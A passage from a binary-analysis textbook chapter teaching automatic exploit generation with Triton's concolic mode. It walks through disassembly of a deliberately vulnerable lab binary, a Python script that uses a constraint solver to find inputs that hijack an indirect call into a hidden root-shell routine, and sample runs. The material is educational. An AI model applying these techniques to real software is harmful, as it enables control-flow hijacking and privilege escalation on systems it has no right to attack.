<p class="indent">Note that the called address corresponds to the hash interpreted as a little-endian address <span class="ent">➊</span>! There’s no code at that address, so the program crashes with a segmentation fault <span class="ent">➋</span>. However, recall that the user controls not only the index but also the string used as the input for the hash. The challenge is to find a string that hashes exactly to the address of the secret admin area and then trick the indirect call into using that hash as the call target, thereby transferring control to the admin area and giving you a root shell without needing to know the password.</p>&#13;
<p class="indent">To manually craft an exploit for this vulnerability, you would need to either use brute force or reverse engineer the <code>hash</code> function to figure out which input string provides the desired hash. The great thing about using symbex to generate the exploit is that it will automatically solve the <code>hash</code> function, allowing you to simply treat it as a black box!</p>&#13;
<h4 class="h4" id="ch13_5_2"><em>13.5.2 Finding the Address of the Vulnerable Call Site</em></h4>&#13;
<p class="noindent">Automatically building the exploit requires two key pieces of information: the address of the vulnerable indirect call site that the exploit should hijack and the address of the secret admin area where you want to redirect control. <a href="ch13.xhtml#ch13list13">Listing 13-13</a> shows the disassembly of the <code>main</code> function from the <code>icall</code> binary, which contains both these addresses.</p>&#13;
<p class="listing1" id="ch13list13"><em>Listing 13-13: Disassembly excerpt from</em> ~/code/chapter13/icall</p>&#13;
<pre>   0000000000400abe &lt;main&gt;:<br/>     400abe:  55                    push   rbp<br/>     400abf:  48 89 e5              mov    rbp,rsp<br/>     400ac2:  48 83 ec 20           sub    rsp,0x20<br/>     400ac6:  89 7d ec              mov    DWORD PTR [rbp-0x14],edi<br/>     400ac9:  48 89 75 e0           mov    QWORD PTR [rbp-0x20],rsi<br/>     400acd:  48 c7 05 c8 15 20 00  mov    QWORD PTR [rip+0x2015c8],0x400916<br/>     400ad4:  16 09 40 00<br/>     400ad8:  48 c7 05 c5 15 20 00  mov    QWORD PTR [rip+0x2015c5],0x400974<br/>     400adf:  74 09 40 00<br/>     400ae3:  83 7d ec 02           cmp    DWORD PTR [rbp-0x14],0x2<br/>     400ae7:  7f 23                 jg     400b0c &lt;main+0x4e&gt;<br/>     400ae9:  48 8b 45 e0           mov    rax,QWORD PTR [rbp-0x20]<br/>     400aed:  48 8b 00              mov    rax,QWORD PTR [rax]<br/>     400af0:  48 89 c6              mov    rsi,rax<br/><span epub:type="pagebreak" id="page_360"/>     400af3:  bf a1 0c 40 00        mov    edi,0x400ca1<br/>     400af8:  b8 00 00 00 00        mov    eax,0x0<br/>     400afd:  e8 5e fc ff ff        call   400760 &lt;printf@plt&gt;<br/>     400b02:  b8 01 00 00 00        mov    eax,0x1<br/>     400b07:  e9 ea 00 00 00        jmp    400bf6 &lt;main+0x138&gt;<br/>     400b0c:  83 7d ec 03           cmp    DWORD PTR [rbp-0x14],0x3<br/>     400b10:  7e 78                 jle    400b8a &lt;main+0xcc&gt;<br/>     400b12:  48 8b 45 e0           mov    rax,QWORD PTR [rbp-0x20]<br/>     400b16:  48 83 c0 18           add    rax,0x18<br/>     400b1a:  48 8b 00              mov    rax,QWORD PTR [rax]<br/>     400b1d:  be bd 0c 40 00        mov    esi,0x400cbd<br/>     400b22:  48 89 c7              mov    rdi,rax<br/>     400b25:  e8 56 fc ff ff        call   400780 &lt;crypt@plt&gt;<br/>     400b2a:  be c8 0c 40 00        mov    esi,0x400cc8<br/>     400b2f:  48 89 c7              mov    rdi,rax<br/>     400b32:  e8 69 fc ff ff        call   4007a0 &lt;strcmp@plt&gt;<br/>     400b37:  85 c0                 test   eax,eax<br/>     400b39:  75 4f                 jne    400b8a &lt;main+0xcc&gt;<br/><span class="ent">➊</span>   400b3b:  e8 70 fc ff ff        call   4007b0 &lt;getegid@plt&gt;<br/>     400b40:  89 c7                 mov    edi,eax<br/><span class="ent">➋</span>   400b42:  e8 79 fc ff ff        call   4007c0 &lt;setgid@plt&gt;<br/>     400b47:  85 c0                 test   eax,eax<br/>     400b49:  74 0a                 je     400b55 &lt;main+0x97&gt;<br/>     400b4b:  bf e9 0c 40 00        mov    edi,0x400ce9<br/>     400b50:  e8 7b fc ff ff        call   4007d0 &lt;perror@plt&gt;<br/>     400b55:  e8 16 fc ff ff        call   400770 &lt;geteuid@plt&gt;<br/>     400b5a:  89 c7                 mov    edi,eax<br/><span class="ent">➌</span>   400b5c:  e8 8f fc ff ff        call   4007f0 &lt;setuid@plt&gt;<br/>     400b61:  85 c0                 test   eax,eax<br/>     400b63:  74 0a                 je     400b6f &lt;main+0xb1&gt;<br/>     400b65:  bf f0 0c 40 00        mov    edi,0x400cf0<br/>     400b6a:  e8 61 fc ff ff        call   4007d0 &lt;perror@plt&gt;<br/>     400b6f:  ba 00 00 00 00        mov    edx,0x0<br/>     400b74:  be f7 0c 40 00        mov    esi,0x400cf7<br/>     400b79:  bf f7 0c 40 00        mov    edi,0x400cf7<br/>     400b7e:  b8 00 00 00 00        mov    eax,0x0<br/><span class="ent">➍</span>   400b83:  e8 78 fc ff ff        call   400800 &lt;execl@plt&gt;<br/>     400b88:  eb 67                 jmp    400bf1 &lt;main+0x133&gt;<br/>     400b8a:  48 8b 45 e0           mov    rax,QWORD PTR [rbp-0x20]<br/>     400b8e:  48 83 c0 10           add    rax,0x10<br/>     400b92:  48 8b 00              mov    rax,QWORD PTR [rax]<br/>     400b95:  be b0 20 60 00        mov    esi,0x6020b0<br/>     400b9a:  48 89 c7              mov    rdi,rax<br/>     400b9d:  e8 30 fe ff ff        call   4009d2 &lt;hash&gt;<br/>     400ba2:  48 8b 45 e0           mov    rax,QWORD PTR [rbp-0x20]<br/>     400ba6:  48 83 c0 08           add    rax,0x8<br/>     400baa:  48 8b 00              mov    rax,QWORD PTR [rax]<br/><span epub:type="pagebreak" id="page_361"/>     400bad:  ba 00 00 00 00        mov    edx,0x0<br/>     400bb2:  be 00 00 00 00        mov    esi,0x0<br/>     400bb7:  48 89 c7              mov    rdi,rax<br/>     400bba:  e8 21 fc ff ff        call   4007e0 &lt;strtoul@plt&gt;<br/>     400bbf:  89 45 fc              mov    DWORD PTR [rbp-0x4],eax<br/>     400bc2:  8b 45 fc              mov    eax,DWORD PTR [rbp-0x4]<br/>     400bc5:  48 8b 04 c5 a0 20 60  mov    rax,QWORD PTR [rax*8+0x6020a0]<br/>     400bcc:  00      <br/>     400bcd:  48 89 c6              mov    rsi,rax<br/>     400bd0:  bf ff 0c 40 00        mov    edi,0x400cff<br/>     400bd5:  b8 00 00 00 00        mov    eax,0x0<br/>     400bda:  e8 81 fb ff ff        call   400760 &lt;printf@plt&gt;<br/>     400bdf:  8b 45 fc              mov    eax,DWORD PTR [rbp-0x4]<br/>     400be2:  48 8b 04 c5 a0 20 60  mov    rax,QWORD PTR [rax*8+0x6020a0]<br/>     400be9:  00<br/>     400bea:  bf b0 20 60 00        mov    edi,0x6020b0<br/><span class="ent">➎</span>   400bef: ff d0                  call   rax<br/>     400bf1:  b8 00 00 00 00        mov    eax,0x0<br/>     400bf6:  c9                    leave<br/>     400bf7:  c3                    ret<br/>     400bf8:  0f 1f 84 00 00 00 00  nop    DWORD PTR [rax+rax*1+0x0]<br/>     400bff:  00</pre>&#13;
<p class="indent">The code for the secret admin area starts at address <code>0x400b3b</code> <span class="ent">➊</span>, so that’s where you’ll want to redirect control. You can tell it’s the admin area by the calls to <code>setgid</code> <span class="ent">➋</span> and <code>setuid</code> <span class="ent">➌</span>, where <code>icall</code> prepares the <code>root</code> privileges for the shell, and by the call to <code>execl</code> <span class="ent">➍</span> that spawns the shell itself. The vulnerable indirect call site to hijack is at address <code>0x400bef</code> <span class="ent">➎</span>.</p>&#13;
<p class="indent">Now that you have the necessary addresses, let’s build the symbex tool to generate the exploit.</p>&#13;
<h4 class="h4" id="ch13_5_3"><em>13.5.3 Building the Exploit Generator</em></h4>&#13;
<p class="noindent">Briefly put, the tool that generates the exploit works by concolically executing the <code>icall</code> program, symbolizing all of the command line arguments given by the user, with a separate symbolic variable per byte of input. It then tracks this symbolic state all the way from the start of the program and through the <code>hash</code> function until execution finally reaches the indirect call site to exploit. At that point, the exploit generator calls the constraint solver and asks it if there’s any assignment of concrete values to the symbolic variables that makes the indirect call target (stored in <code>rax</code>) equal to the address of the secret admin area. If such a model exists, the exploit generator prints it to screen, and you can then use those values as input to exploit the <code>icall</code> program.</p>&#13;
<p class="indent">Note that in contrast to the earlier examples, this one uses Triton’s concolic mode rather than its symbolic emulation mode. The reason is that generating the exploit requires tracing the symbolic state through a whole program across multiple functions, which is inconvenient and slow in emulation <span epub:type="pagebreak" id="page_362"/>mode. Moreover, concolic execution mode makes it easy to experiment with different lengths for the input string.</p>&#13;
<p class="indent">Unlike most examples in this book, this one is written in Python because Triton’s concolic mode only allows you to use the Python API. Concolic Triton tools are Python scripts that you pass to a special Pin tool that provides Triton’s concolic engine. Triton provides a wrapper script called <code>triton</code> that automatically takes care of all the details of calling Pin so that all you have to do is specify which Triton tool to use and which program to analyze. You can find the <code>triton</code> wrapper script in <em>~/triton/pin-2.14-71313-gcc.4.4.7-linux/ source/tools/Triton/build</em>, and you’ll see an example of how to use it when testing the automatic exploit generation tool.</p>&#13;
<h5 class="h5">Setting Up the Concolic Execution</h5>&#13;
<p class="noindent"><a href="ch13.xhtml#ch13list14">Listing 13-14</a> shows the first part of the exploit generation tool, <em>exploit _callsite.py</em>.</p>&#13;
<p class="listing1" id="ch13list14"><em>Listing 13-14:</em> exploit_callsite.py</p>&#13;
<pre>   #!/usr/bin/env python2<br/>   ## -*- coding: utf-8 -*-<br/><br/><span class="ent">➊</span> import triton<br/>   import pintool<br/><br/><span class="ent">➋</span> taintedCallsite = 0x400bef # Found in a previous DTA pass<br/>   target          = 0x400b3b # Target to redirect callsite to<br/><br/><span class="ent">➌</span> Triton = pintool.getTritonContext()<br/><br/>   def main():<br/><span class="ent">➍</span>     Triton.setArchitecture(triton.ARCH.X86_64)<br/>       Triton.enableMode(triton.MODE.ALIGNED_MEMORY, True)<br/><br/><span class="ent">➎</span>     pintool.startAnalysisFromSymbol('main')<br/><br/><span class="ent">➏</span>     pintool.insertCall(symbolize_inputs, pintool.INSERT_POINT.ROUTINE_ENTRY, 'main')<br/><span class="ent">➐</span>     pintool.insertCall(hook_icall, pintool.INSERT_POINT.BEFORE)<br/><br/><span class="ent">➑</span>     pintool.runProgram()<br/><br/>   if __name__ == '__main__':<br/>       main()</pre>&#13;
<p class="indent">Concolic Triton tools like <em>exploit_callsite.py</em> must import the <code>triton</code> and <code>pintool</code> modules <span class="ent">➊</span>, which provide access to the familiar Triton API and Triton’s bindings for interacting with Pin, respectively. Unfortunately, <span epub:type="pagebreak" id="page_363"/>there’s no way to pass command line arguments to concolic Triton tools, so I’ve instead hardcoded the addresses of the indirect call site you’re exploiting (<code>taintedCallsite</code>) and the secret admin area (<code>target</code>) <span class="ent">➋</span> to which you want to redirect control. The <code>taintedCallsite</code> variable gets its name from the assumption that you found this call site in a previous taint analysis pass. As an alternative to hardcoded arguments, you could also pass arguments via environment variables, for example.</p>&#13;
<p class="indent">Concolic Triton tools maintain the symbex state in a global Triton context, which you access by calling <code>pintool.getTritonContext()</code> <span class="ent">➌</span>. This returns a <code>TritonContext</code> object that you can use to access (a subset of) the familiar Triton API functions. Here, <em>exploit_callsite.py</em> stores a reference to that <code>TritonContext</code> in a global variable called <code>Triton</code> for easy access.</p>&#13;
<p class="indent">The main logic of <em>exploit_callsite.py</em> starts in the function named <code>main</code>, which is called when the script starts. Just like in the C++ symbolic emulation tools you saw earlier, it starts by setting the Triton architecture and enabling the <code>ALIGNED_MEMORY</code> optimization <span class="ent">➍</span>. Because this tool is tailored toward the <code>icall</code> binary you’re exploiting, I’ve simply hardcoded the architecture to x86-64 instead of making it configurable.</p>&#13;
<p class="indent">Next, <em>exploit_callsite.py</em> uses Triton’s <code>pintool</code> API to set up the starting point for the concolic analysis. It tells Triton to start the symbolic analysis from the <code>main</code> function in the vulnerable <code>icall</code> program <span class="ent">➎</span>. That means all of <code>icall</code>’s initialization code that comes before <code>main</code> runs without symbolic analysis, and Triton’s analysis kicks in once execution reaches <code>main</code>.</p>&#13;
<p class="indent">Note that this assumes that symbols are available; if they aren’t, then Triton won’t know where the <code>main</code> function is. In that case, you’ll instead have to find the address of <code>main</code> yourself through disassembly and tell Triton to start analysis at that address by calling <code>pintool.startAnalysisFromAddress</code> instead of <code>pintool.startAnalysisFromSymbol</code>.</p>&#13;
<p class="indent">After configuring the analysis starting point, <em>exploit_callsite.py</em> registers two callbacks using Triton’s <code>pintool.insertCall</code> function. The <code>pintool.insertCall</code> function takes at least two arguments: a callback function and an <em>insert point</em>, followed by zero or more optional arguments depending on the type of insert point.</p>&#13;
<p class="indent">The first installed callback function is named <code>symbolize_inputs</code> and uses the insert point <code>INSERT_POINT.ROUTINE_ENTRY</code> <span class="ent">➏</span>, which means the callback triggers when execution reaches the entry point of a given routine. You can specify that routine by name in an extra argument to <code>insertCall</code>. In the case of <code>symbolize_inputs</code>, I’ve specified <code>main</code> as the routine to install the callback on because the purpose of <code>symbolize_inputs</code> is to symbolize all of the user inputs given to <code>icall</code>’s <code>main</code> function. When a callback of type <code>ROUTINE_ENTRY</code> happens, Triton passes the current thread ID as an argument to the callback function.</p>&#13;
<p class="indent">The second callback is named <code>hook_icall</code>, and it’s installed on the insert point <code>INSERT_POINT.BEFORE</code> <span class="ent">➐</span>, meaning that the callback triggers before every instruction. The job of <code>hook_icall</code> is to check whether execution has reached the vulnerable indirect call site and, if so, generate an exploit for it given <span epub:type="pagebreak" id="page_364"/>the results of the symbolic analysis. When the callback triggers, Triton provides <code>hook_icall</code> with an <code>Instruction</code> argument representing the details of the instruction that’s about to execute so that <code>hook_icall</code> can check whether it’s the indirect call instruction you want to exploit. <a href="ch13.xhtml#ch13tab1">Table 13-1</a> shows an overview of all the possible insert points Triton supports.</p>&#13;
<p class="tab-caption" id="ch13tab1"><strong>Table 13-1:</strong> Triton Insert Points for Callbacks in Concolic Mode</p>&#13;
<table class="topbot-d">&#13;
<thead>&#13;
<tr>&#13;
<td style="border-top: solid 0.3em; border-bottom: solid 0.2em;"><strong>Insert point</strong></td>&#13;
<td style="border-top: solid 0.3em; border-bottom: solid 0.2em;"><strong>Callback moment</strong></td>&#13;
<td style="border-top: solid 0.3em; border-bottom: solid 0.2em;"><strong>Arguments</strong></td>&#13;
<td style="border-top: solid 0.3em; border-bottom: solid 0.2em;"><strong>Callback arguments</strong></td>&#13;
</tr>&#13;
</thead>&#13;
<tbody>&#13;
<tr>&#13;
<td><code>AFTER</code></td>&#13;
<td>After instruction executes</td>&#13;
<td/>&#13;
<td><code>Instruction</code> object</td>&#13;
</tr>&#13;
<tr>&#13;
<td><code>BEFORE</code></td>&#13;
<td>Before instruction executes</td>&#13;
<td/>&#13;
<td><code>Instruction</code> object</td>&#13;
</tr>&#13;
<tr>&#13;
<td><code>BEFORE_SYMPROC</code></td>&#13;
<td>Before symbolic processing</td>&#13;
<td/>&#13;
<td><code>Instruction</code> object</td>&#13;
</tr>&#13;
<tr>&#13;
<td><code>FINI</code></td>&#13;
<td>End of execution</td>&#13;
<td/>&#13;
<td/>&#13;
</tr>&#13;
<tr>&#13;
<td><code>ROUTINE_ENTRY</code></td>&#13;
<td>Routine entry point</td>&#13;
<td>Routine name</td>&#13;
<td>Thread ID</td>&#13;
</tr>&#13;
<tr>&#13;
<td><code>ROUTINE_EXIT</code></td>&#13;
<td>Routine exit</td>&#13;
<td>Routine name</td>&#13;
<td>Thread ID</td>&#13;
</tr>&#13;
<tr>&#13;
<td><code>IMAGE_LOAD</code></td>&#13;
<td>New image loaded</td>&#13;
<td/>&#13;
<td>Image path, base address, size</td>&#13;
</tr>&#13;
<tr>&#13;
<td><code>SIGNALS</code></td>&#13;
<td>Signal delivery</td>&#13;
<td/>&#13;
<td>Thread ID, signal ID</td>&#13;
</tr>&#13;
<tr>&#13;
<td><code>SYSCALL_ENTRY</code></td>&#13;
<td>Before syscall</td>&#13;
<td/>&#13;
<td>Thread ID, syscall descriptor</td>&#13;
</tr>&#13;
<tr>&#13;
<td style="border-bottom: solid 0.2em;"><code>SYSCALL_EXIT</code></td>&#13;
<td style="border-bottom: solid 0.2em;">After syscall</td>&#13;
<td style="border-bottom: solid 0.2em;"/>&#13;
<td style="border-bottom: solid 0.2em;">Thread ID, syscall descriptor</td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<p class="indent">Finally, after completing the prerequisite setup, <em>exploit_callsite.py</em> calls <code>pintool.runProgram</code> to start running the analyzed program <span class="ent">➑</span>. That completes all the necessary setup for concolically analyzing the <code>icall</code> program, but I haven’t yet discussed any of the code responsible for generating the actual exploit. Let’s do that now and discuss the callback handler functions <code>symbolize_inputs</code> and <code>hook_icall</code>, which implement the user input symbolization and the call site exploitation, respectively.</p>&#13;
<h5 class="h5">Symbolizing the User Inputs</h5>&#13;
<p class="noindent"><a href="ch13.xhtml#ch13list15">Listing 13-15</a> shows the implementation of <code>symbolize_inputs</code>, the handler that’s called when execution reaches the <code>main</code> function of the analyzed program. In accordance with <a href="ch13.xhtml#ch13tab1">Table 13-1</a>, <code>symbolize_inputs</code> takes a thread ID parameter because it’s a callback for the <code>ROUTINE_ENTRY</code> insert point. For the purposes of this example, you don’t need to know the thread ID and can simply ignore it. As mentioned previously, <code>symbolize_inputs</code> symbolizes all the command line arguments given by the user so that the solver can later figure out how to manipulate these symbolic variables to craft an exploit.</p>&#13;
<p class="listing1" id="ch13list15"><em>Listing 13-15:</em> exploit_callsite.py <em>(continued)</em></p>&#13;
<pre>   def symbolize_inputs(tid):<br/><span class="ent">➊</span>     rdi = pintool.getCurrentRegisterValue(Triton.registers.rdi) # argc<br/>       rsi = pintool.getCurrentRegisterValue(Triton.registers.rsi) # argv<br/><br/>       # for each string in argv<br/><span class="ent">➋</span>     while rdi &gt; 1:<br/><span class="ent">➌</span>         addr = pintool.getCurrentMemoryValue(<br/>           rsi + ((rdi-1)*triton.CPUSIZE.QWORD),<br/><span epub:type="pagebreak" id="page_365"/><br/>           triton.CPUSIZE.QWORD)<br/>       # symbolize current argument string (including terminating NULL)<br/>       c = None<br/>       s = ''<br/><span class="ent">➍</span>     while c != 0:<br/><span class="ent">➎</span>         c = pintool.getCurrentMemoryValue(addr)<br/>           s += chr(c)<br/><span class="ent">➏</span>         Triton.setConcreteMemoryValue(addr, c)<br/><span class="ent">➐</span>         Triton.convertMemoryToSymbolicVariable(<br/>                   triton.MemoryAccess(addr, triton.CPUSIZE.BYTE)<br/>               ).setComment('argv[%d][%d]' % (rdi-1, len(s)-1))<br/>           addr += 1<br/>       rdi -= 1<br/>       print 'Symbolized argument %d: %s' % (rdi, s)</pre>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_366"/>To symbolize the user inputs, <code>symbolize_inputs</code> needs access to the argument count (<code>argc</code>) and argument vector (<code>argv</code>) of the analyzed program. Because <code>symbolize_inputs</code> is called when <code>main</code> starts, you can get <code>argc</code> and <code>argv</code> by reading the <code>rdi</code> and <code>rsi</code> registers, which contain <code>main</code>’s first two arguments according to the x86-64 System V ABI <span class="ent">➊</span>. To read a register’s current value as it is in the concrete execution, you use the <code>pintool.getCurrentRegisterValue</code> function, giving the register’s ID as input.</p>&#13;
<p class="indent">After obtaining <code>argc</code> and <code>argv</code>, <code>symbolize_inputs</code> loops over all the arguments by decrementing <code>rdi</code> (<code>argc</code>) until no more arguments remain <span class="ent">➋</span>. Recall that in C/C++ programs, <code>argv</code> is an array of pointers to character strings. To get a pointer from <code>argv</code>, <code>symbolize_inputs</code> reads 8 bytes (<code>triton.CPUSIZE.QWORD</code>) from the <code>argv</code> entry currently indexed by <code>rdi</code> using Triton’s <code>pintool.getCurrentMemoryValue</code> function, which takes an address and size as input <span class="ent">➌</span>, and stores the read pointer in <code>addr</code>.</p>&#13;
<p class="indent">Next, <code>symbolize_inputs</code> reads all of the characters from the string pointed to by <code>addr</code> in turn, incrementing <code>addr</code> until it reads a <code>NULL</code> character <span class="ent">➍</span>. To read each character, it again uses <code>getCurrentMemoryValue</code> <span class="ent">➎</span>, this time without a size argument so that it reads the default size of 1 byte. After reading a character, <code>symbolize_inputs</code> sets that character as the concrete value for that memory address in Triton’s global context <span class="ent">➏</span> and converts the memory address containing the user input byte into a symbolic variable <span class="ent">➐</span>, setting a comment on that symbolic variable to later remind you to which <code>argv</code> index it corresponds. Again, this should be familiar from the C++ examples you saw before.</p>&#13;
<p class="indent">After <code>symbolize_inputs</code> completes, all of the command line arguments given by the user will have been converted into separate symbolic variables (one per input byte) and set as concrete state in Triton’s global context. Now let’s see how <em>exploit_callsite.py</em> uses the solver to solve for these symbolic variables and find an exploit for the vulnerable call site.</p>&#13;
<h5 class="h5"><span epub:type="pagebreak" id="page_367"/>Solving for an Exploit</h5>&#13;
<p class="noindent"><a href="ch13.xhtml#ch13list16">Listing 13-16</a> shows <code>hook_icall</code>, the callback that’s called just before every instruction.</p>&#13;
<p class="listing1" id="ch13list16"><em>Listing 13-16:</em> exploit_callsite.py <em>(continued)</em></p>&#13;
<pre>   def hook_icall(insn):<br/><span class="ent">➊</span>     if insn.isControlFlow() and insn.getAddress() == taintedCallsite:<br/><span class="ent">➋</span>         for op in insn.getOperands():<br/><span class="ent">➌</span>             if op.getType() == triton.OPERAND.REG:<br/>                  print 'Found tainted indirect call site \'%s\'' % (insn)<br/><span class="ent">➍</span>                exploit_icall(insn, op)</pre>&#13;
<p class="indent">For each instruction, <code>hook_icall</code> checks whether it’s the indirect call that you want to exploit. It first verifies that this is a control flow instruction <span class="ent">➊</span> and that it has the address of the call site you want to exploit. It then loops over all the instruction’s operands <span class="ent">➋</span> to find the register operand containing the call site’s target address <span class="ent">➌</span>. Finally, if all these checks hold up, <code>hook_icall</code> calls the <code>exploit_icall</code> function to compute the exploit itself <span class="ent">➍</span>. <a href="ch13.xhtml#ch13list17">Listing 13-17</a> shows the implementation of <code>exploit_icall</code>.</p>&#13;
<p class="listing1" id="ch13list17"><em>Listing 13-17:</em> exploit_callsite.py <em>(continued)</em></p>&#13;
<pre>   def exploit_icall(insn, op):<br/><span class="ent">➊</span>      regId   = Triton.getSymbolicRegisterId(op)<br/><span class="ent">➋</span>      regExpr = Triton.unrollAst(Triton.getAstFromId(regId))<br/><span class="ent">➌</span>      ast = Triton.getAstContext()<br/><br/><span class="ent">➍</span>      exploitExpr = ast.equal(regExpr, ast.bv(target, triton.CPUSIZE.QWORD_BIT))<br/><span class="ent">➎</span>      for k, v in Triton.getSymbolicVariables().iteritems():<br/><span class="ent">➏</span>          if 'argv' in v.getComment():<br/>               # Argument characters must be printable<br/><span class="ent">➐</span>             argExpr = Triton.getAstFromId(k)<br/><span class="ent">➑</span>             argExpr = ast.land([<br/>                             ast.bvuge(argExpr, ast.bv(32, triton.CPUSIZE.BYTE_BIT)),<br/>                             ast.bvule(argExpr, ast.bv(126, triton.CPUSIZE.BYTE_BIT))<br/>                        ])<br/><span class="ent">➒</span>             exploitExpr = ast.land([exploitExpr, argExpr])<br/><br/>       print 'Getting model for %s -&gt; 0x%x' % (insn, target)<br/><span class="ent">➓</span>     model = Triton.getModel(exploitExpr)<br/>      for k, v in model.iteritems():<br/>          print '%s (%s)' % (v, Triton.getSymbolicVariableFromId(k).getComment())</pre>&#13;
<p class="indent">To compute the exploit for the vulnerable call site, <code>exploit_icall</code> starts by getting the register ID of the register operand containing the indirect call’s target address <span class="ent">➊</span>. It then calls <code>Triton.getAstFromId</code> to get the AST containing the symbolic expression for this register and calls <code>Triton.unrollAst</code> to “unroll” it into a fully expanded AST without reference nodes <span class="ent">➋</span>.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_368"/>Next, <code>exploit_icall</code> gets a Triton <code>AstContext</code>, which it uses to build the AST expression for the solver <span class="ent">➌</span>, just like you saw before in the code coverage tool in <a href="ch13.xhtml#ch13_4">Section 13.4</a>. The base constraint to satisfy for the exploit is straightforward: you want to find a solution such that the symbolic expression for the indirect call’s target register equals the address of the secret admin area as stored in the global <code>target</code> variable <span class="ent">➍</span>.</p>&#13;
<p class="indent">Note that the constant <code>triton.CPUSIZE.QWORD_BIT</code> represents the size of a machine quad word (8 bytes) <em>in bits</em> in contrast to <code>triton.CPUSIZE.QWORD</code>, which represents that same size in bytes. This means that <code>ast.bv(target, triton.CPUSIZE.QWORD_BIT)</code> builds a 64-bit bitvector containing the address of the secret admin area.</p>&#13;
<p class="indent">In addition to the base constraint for the target register expression, the exploit requires some constraints on the form the user inputs can take. To impose these constraints, <code>exploit_icall</code> loops over all the symbolic variables <span class="ent">➎</span>, checking their comments to see whether they represent user input bytes from <code>argv</code> <span class="ent">➏</span>. If so, <code>exploit_icall</code> gets the symbolic variable’s AST expression <span class="ent">➐</span> and constrains it such that the byte must be a printable ASCII character <span class="ent">➑</span> ( ≥ 32 and ≥ 126). It then appends this constraint to the overall list of constraints for the exploit <span class="ent">➒</span>.</p>&#13;
<p class="indent">Finally, <code>exploit_icall</code> calls <code>Triton.getModel</code> to compute an exploit model for the set of constraints it just built <span class="ent">➓</span>, and if such a model exists, it prints the model to screen so that the user can use it to exploit the <code>icall</code> program. For each variable in the model, the output shows its Triton ID as well as its human-readable comment that says to which <code>argv</code> byte the symbolic variable corresponds. That way, the user can easily map the model back onto concrete command line arguments. Let’s try this by generating an exploit for the <code>icall</code> program and using it to gain a root shell.</p>&#13;
<h4 class="h4" id="ch13_5_4"><em>13.5.4 Getting a Root Shell</em></h4>&#13;
<p class="noindent"><a href="ch13.xhtml#ch13list18">Listing 13-18</a> shows how to use <em>exploit_callsite.py</em> in practice to generate an exploit for the <code>icall</code> program.</p>&#13;
<p class="listing1" id="ch13list18"><em>Listing 13-18: Trying to find an exploit for</em> <span class="codeitalic">icall</span> <em>with input length 3</em></p>&#13;
<pre><span class="ent">➊</span> $ <span class="codestrong1">cd ~/triton/pin-2.14-71313-gcc.4.4.7-linux/source/tools/Triton/build</span><br/><span class="ent">➋</span> $ <span class="codestrong1">./triton <span class="ent">➌</span>~/code/chapter13/exploit_callsite.py \</span><br/>             <span class="ent">➍</span><span class="codestrong1">~/code/chapter13/icall 2 AAA</span><br/><span class="ent">➎</span> Symbolized argument 2: AAA<br/>   Symbolized argument 1: 2<br/><span class="ent">➏</span> Calling 0x223c625e<br/><span class="ent">➐</span> Found tainted indirect call site '0x400bef: call rax'<br/><span class="ent">➑</span> Getting model for 0x400bef: call rax -&gt; 0x400b3b<br/>   # no model found</pre>&#13;
<p class="indent">First, you navigate to the main Triton directory on the VM, where you’ll find the <code>triton</code> wrapper script <span class="ent">➊</span>. Recall that Triton provides this wrapper script to automatically handle the required Pin setup for concolic tools. In a <span epub:type="pagebreak" id="page_369"/>nutshell, the wrapper script runs the analyzed program (<code>icall</code>) in Pin using Triton’s concolic library as the Pintool. That library takes your user-defined concolic tool (<em>exploit_callsite.py</em>) as an argument and takes care of starting the tool.</p>&#13;
<p class="indent">All you need to do to start the analysis is call the <code>triton</code> wrapper script <span class="ent">➋</span>, passing the name of the <em>exploit_callsite.py</em> script <span class="ent">➌</span> and the name and arguments of the program to analyze (<code>icall</code> with index 2 and input string <code>AAA</code>) <span class="ent">➍</span>. The <code>triton</code> wrapper script now ensures that <code>icall</code> runs with the given arguments in Pin under control of the <em>exploit_callsite.py</em> script. Note that the input string <code>AAA</code> is not an exploit but just an arbitrary string to drive the concolic execution.</p>&#13;
<p class="indent">The script intercepts <code>icall</code>’s <code>main</code> function and symbolizes all the user input bytes in <code>argv</code> <span class="ent">➎</span>. When <code>icall</code> reaches the indirect call site, it uses the address <code>0x223c625e</code> as the target <span class="ent">➏</span>, which is the hash of <code>AAA</code>. This is a bogus address that would normally lead to a crash, but in this case it doesn’t matter because <em>exploit_callsite.py</em> computes the exploit model before the indirect call ever executes.</p>&#13;
<p class="indent">When the indirect call is about to execute <span class="ent">➐</span>, <em>exploit_callsite.py</em> tries to find a model that yields a set of user inputs that hash to the call target <code>0x400b3b</code>, which is the address of the secret admin area <span class="ent">➑</span>. Note that this step may take a while, up to a few minutes depending on your hardware configuration. Unfortunately, the solver is unable to find a model, so <em>exploit_callsite.py</em> stops without finding an exploit.</p>&#13;
<p class="indent">Luckily, this doesn’t necessarily mean that no exploit exists. Recall that you’ve given the concolic execution of <code>icall</code> the input string <code>AAA</code> and that <em>exploit_callsite.py</em> creates a separate symbolic variable for each of the three input bytes in that string. As a result, the solver tries to find an exploit model based on a user input string of length 3. Thus, the solver’s inability to find an exploit means only that there’s no input string <em>of length 3</em> that forms a suitable exploit, but you may have more luck for inputs of a different length. Rather than trying every possible input length manually, you can automate this process, as shown in <a href="ch13.xhtml#ch13list19">Listing 13-19</a>.</p>&#13;
<p class="listing1" id="ch13list19"><em>Listing 13-19: Scripting exploit attempts with varying input length</em></p>&#13;
<pre>   <span class="codestrong1">$ cd ~/triton/pin-2.14-71313-gcc.4.4.7-linux/source/tools/Triton/build</span><br/><span class="ent">➋</span> <span class="codestrong1">$ for i in $(seq 1 100); do</span><br/>      <span class="codestrong1">str=`python -c "print 'A'*"${i}`</span><br/>      <span class="codestrong1">echo "Trying input len ${i}"</span><br/><span class="ent">➌</span>    <span class="codestrong1">./triton ~/code/chapter13/exploit_callsite.py ~/code/chapter13/icall 2 ${str} \</span><br/>       <span class="codestrong1">| grep -a SymVar</span><br/>     <span class="codestrong1">done</span><br/><span class="ent">➍</span> Trying input len 1<br/>   Trying input len 2<br/>   Trying input len 3<br/>   Trying input len 4<br/><span class="ent">➎</span> SymVar_0 = 0x24 (argv[2][0])<br/>   SymVar_1 = 0x2A (argv[2][1])<br/><span epub:type="pagebreak" id="page_370"/>&#13;
